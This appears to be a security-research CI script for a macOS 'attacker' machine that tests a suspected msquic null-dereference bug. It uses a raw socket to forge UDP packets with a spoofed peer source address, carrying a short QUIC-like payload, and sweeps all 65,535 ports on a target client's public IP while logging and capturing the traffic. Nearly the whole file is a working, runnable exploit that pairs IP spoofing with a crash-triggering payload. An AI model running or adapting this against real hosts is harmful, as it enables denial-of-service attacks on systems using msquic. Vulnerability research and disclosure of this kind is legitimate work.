#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/attacker-macos"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "peer-mapping.json" "$RESULTS/mapping.json" 300

ATTACKER_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
PEER_IP="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["peer_ip"])
PY
)"
CLIENT_PUBLIC_IP="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["client_public_ip"])
PY
)"
PEER_PORT="$(python3 - "$RESULTS/mapping.json" <<'PY'
import json,sys
print(json.load(open(sys.argv[1]))["peer_port"])
PY
)"
printf 'ATTACKER_PUBLIC_IP=%s\nPEER_IP=%s\nCLIENT_PUBLIC_IP=%s\nDESTINATION_PORT_RANGE=1-65535\nPEER_PORT=%s\n' \
  "$ATTACKER_PUBLIC_IP" "$PEER_IP" "$CLIENT_PUBLIC_IP" "$PEER_PORT" | tee "$RESULTS/network-identities.txt"
if [ "$ATTACKER_PUBLIC_IP" = "$CLIENT_PUBLIC_IP" ] || [ "$ATTACKER_PUBLIC_IP" = "$PEER_IP" ]; then
  echo "FAIL: attacker and target/peer are not distinct public IP endpoints"
  exit 1
fi

IFACE="$(route -n get default | awk '/interface:/{print $2; exit}')"
if command -v tcpdump >/dev/null 2>&1 && [ -n "$IFACE" ]; then
  sudo tcpdump -U -ni "$IFACE" "udp and dst host $CLIENT_PUBLIC_IP" \
    -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
  CAP_PID=$!
else
  CAP_PID=""
fi
cleanup(){ set +e; if [ -n "$CAP_PID" ]; then sudo kill "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; fi; }
trap cleanup EXIT
sleep 1

sudo python3 - "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress,json,socket,struct,sys,time
m=json.load(open(sys.argv[1]))
src=ipaddress.IPv4Address(m["peer_ip"]).packed
dst=ipaddress.IPv4Address(m["client_public_ip"]).packed
sport=int(m["peer_port"])
payload=bytes.fromhex("806b3343cf0000")
sent=0
start=time.monotonic()
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
for dport in range(1,65536):
    udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
    total_len=20+len(udp)
    # Darwin IP_HDRINCL requires ip_len and ip_off in host byte order.
    header=struct.pack("!BBHHHBBH4s4s",0x45,0,total_len,dport & 0xffff,0,64,17,0,src,dst)
    header=header[:2]+struct.pack("=H",total_len)+header[4:6]+struct.pack("=H",0)+header[8:10]+struct.pack("!H",0)+header[12:]
    packet=header+udp
    if len(packet)!=total_len: raise SystemExit("internal packet length mismatch")
    n=s.sendto(packet,(m["client_public_ip"],0))
    if n!=len(packet): raise SystemExit(f"short raw send to UDP port {dport}: {n}/{len(packet)}")
    sent+=1
s.close()
print(f"SPOOF_SWEEP_SENT os=macos total={sent} src={m['peer_ip']}:{sport} dst={m['client_public_ip']}:1-65535 payload={payload.hex()} elapsed_seconds={time.monotonic()-start:.3f}")
PY
sleep 2
cleanup
trap - EXIT
if [ -f "$RESULTS/attacker-egress.pcap" ]; then
  tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 12 >"$RESULTS/attacker-egress.txt" 2>&1 || true
fi
cat "$RESULTS/attacker.log"
[ ! -f "$RESULTS/attacker-egress.txt" ] || cat "$RESULTS/attacker-egress.txt"
